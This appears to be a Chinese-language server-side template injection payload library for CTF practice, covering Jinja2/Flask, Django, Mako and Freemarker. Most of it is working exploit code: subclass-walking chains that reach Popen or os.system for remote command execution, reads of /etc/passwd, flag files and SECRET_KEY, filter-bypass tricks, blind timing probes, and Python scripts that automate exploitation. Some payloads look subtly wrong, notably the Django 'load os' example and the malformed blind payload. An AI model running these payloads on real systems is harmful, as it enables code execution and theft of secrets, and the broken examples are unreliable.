# SSTI 服务端模板注入 - 攻击库
**Keywords**: SSTI, Server-Side Template Injection, Template Injection, Jinja2, Django, Flask, Twig, RCE, Mako, Velocity

## Django/Jinja2 Payload

### 基础注入
```django
{{ 7*7 }}  # 输出49，证明SSTI存在
{{ variable_name }}
{{ object.attribute }}
{{ context }}
```

### 调试输出
```django
{% debug %}  # 输出所有上下文变量
{{ request }}  # 输出request对象
{{ settings }}  # 输出Django设置
```

### 函数调用
```django
{{ ''.__class__ }}
{{ ''.__class__.__mro__ }}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

### 文件读取
```django
{% include "/etc/passwd" %}
{{ open('/flag.txt').read() }}
{{ config.items() }}
```

### RCE
```django
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh -c "id"') }}

# 获取__subclasses__()中的Popen类（通常在40-50之间）
{{ ''.__class__.__mro__[1].__subclasses__()[396]('sh','-c','id') }}

# 使用os.system
{{ ''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id') }}
```

## Flask/Jinja2

```jinja2
# 获取所有subclass
{% for item in ''.__class__.__mro__[2].__subclasses__() %}
  {% if "Popen" in item.__name__ %}
    {{ item('id',shell=True,stdout=-1).communicate() }}
  {% endif %}
{% endfor %}
```

## Mako模板

```mako
<%
  import os
  os.system('id')
%>

${''.join(chr(i) for i in [99,97,116,32,47,102,108,97,103])}
```

## Velocity/Freemarker

```velocity
<#assign classLoader=object?api.class.getClassLoader()>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign method=clazz.getMethod("getRuntime",null)>
<#assign runtime=method.invoke(null,null)>
<#assign proc=runtime.exec("id")>
```

## 实际案例提取

### 案例009: Django SSTI
```bash
# 登录
curl -X POST http://target:8000/login -d "username=test&password=test"

# 在greet端点注入
curl "http://target:8000/greet/?name={{FLAG}}"
curl "http://target:8000/greet/?name={{7*7}}"

# 测试RCE
curl "http://target:8000/greet/?name={{''.__class__.__mro__[2].__subclasses__()[40]('/bin/id')}}"
```

### 案例022: SSTI Include路径遍历
```bash
# 登录
curl -c cookies.txt -X POST http://target:5000/login -d "username=test&password=test"

# 利用SSTI Include功能进行路径遍历
curl -b cookies.txt "http://target:5000/error?error_type=../../../../../flag.txt"
```

### 案例023: 盲SSTI
```python
import requests
import time

target = "http://target:5000"
session = requests.Session()

# 登录
session.post(f"{target}/login", data={'username': 'test', 'password': 'test'})

# 时间延迟SSTI
payload = "1 if 1 else 0).__class__.__mro__[1].__subclasses__()[396]('sleep',5)(5) or 1"

start = time.time()
r = session.get(f"{target}/amortization", params={'term': payload}, timeout=20)
elapsed = time.time() - start

if elapsed > 5:
    print("[+] 盲SSTI确认，延迟约{}秒".format(elapsed))
```

### 案例025: Django SSTI完整链
```python
import requests

target = "http://target:8000"
session = requests.Session()

# Step1: 在name字段注入
session.post(f"{target}/register/step1/", data={
    'name': '{{flag}}',
    'password': 'password123'
})

# Step2: 邮箱
session.post(f"{target}/register/step2/", data={
    'email': 'attacker@test.com'
})

# Step3: 获取flag
r = session.get(f"{target}/register/step3/")

# 提取flag
import re
flag = re.search(r'flag\{[^}]+\}', r.text)
if flag:
    print(f"[+] FLAG: {flag.group(0)}")
```

## 通用RCE Payload

```python
# 自动查找Popen在__subclasses__中的位置
def find_popen_index(base_class):
    """
    找到能执行命令的类(通常是Popen)
    """
    subclasses = base_class.__mro__[2].__subclasses__()
    for i, cls in enumerate(subclasses):
        if 'Popen' in cls.__name__ or 'ProcessPoolExecutor' in cls.__name__:
            return i
    return None

# 执行命令
popen_index = find_popen_index(str)
payload = f"{{{{ ''.__class__.__mro__[2].__subclasses__()[{popen_index}]('id',shell=True,stdout=-1).communicate() }}}}"
```

## 快速识别

1. **寻找模板注入点**
   - `?name=`, `?template=`, `?message=`, `?title=`
   - 在表单、URL、Header中

2. **基础测试**
   ```
   {{ 7*7 }}  -> 输出49
   ${7*7}     -> 输出49
   {% if 1 %}test{% endif %}  -> 输出test
   ```

3. **确定模板引擎**
   - Django/Jinja2: 使用`{{`
   - Mako: 使用`${}` 或`<%>`
   - Velocity: 使用`${}` 或 `#set`
   - Freemarker: 使用`${}`

4. **尝试访问对象**
   ```
   {{ request }}
   {{ config }}
   {{ settings }}
   {{ ''.__class__ }}
   ```

5. **测试RCE**
   ```
   {{ ''.__class__.__mro__[2].__subclasses__() }}
   ```

## 关键对象

| 对象 | 用途 |
|------|------|
| `''.__class__` | 获取str类 |
| `.__mro__` | 获取MRO（方法解析顺序） |
| `.__mro__[2]` | 获取object基类 |
| `.__subclasses__()` | 获取所有子类 |
| `[40]` | 通常是Popen/ProcessPoolExecutor |
| `.__init__` | 获取初始化方法 |
| `.__globals__` | 获取全局变量 |

## Bypass技巧

```django
<!-- 过滤了{{，用{% %}绕过 -->
{% set x=7*7 %}{{ x }}

<!-- 使用变量名绕过 -->
{{ variable_name }}

<!-- 使用属性访问 -->
{{ object.method() }}

<!-- 编码绕过 -->
{{ ''['\x5f\x5fclass\x5f\x5f'] }}

<!-- 下划线绕过 -->
{{ ''['__class__'] }}
```


## 场景补充

### 场景1: Flask/Jinja2 SSTI RCE
```bash
# 基础检测
curl "http://target/page?name={{7*7}}"  # 返回49说明存在SSTI

# RCE payload
curl "http://target/page?name={{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"

# 或使用子类
curl "http://target/page?name={{''.__class__.__mro__[1].__subclasses__()[400]('cat /flag.txt',shell=True,stdout=-1).communicate()}}"
```

### 场景2: Django SSTI
```bash
# 检测
curl "http://target?template={%debug%}"

# RCE
curl "http://target?template={{settings.SECRET_KEY}}"
curl "http://target?template={%load os%}{%os.system('cat /flag.txt')%}"
```

### 场景3: Mako模板注入
```bash
curl "http://target?page=<%import os;os.popen('id').read()%>"
curl "http://target?page=<%import os;os.popen('cat /flag.txt').read()%>"
```

### 场景4: 盲SSTI时间延迟检测
```bash
# Jinja2时间延迟
curl "http://target?name={{''.__class__.__mro__[1].__subclasses__()[200]('sleep 5',shell=True)}}"

# 如果响应延迟5秒,说明存在SSTI
```

### Python自动化SSTI利用
```python
def exploit_ssti_rce(target, param='name'):
    payloads = [
        # Jinja2
        "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
        # Python eval
        "{{''.__class__.__mro__[1].__subclasses__()[400]('cat /flag.txt',shell=True,stdout=-1).communicate()}}",
    ]
    for p in payloads:
        r = requests.get(f"{target}/page", params={param: p})
        if 'flag{' in r.text:
            print(f"[!] FLAG: {r.text}")
            return r.text
```
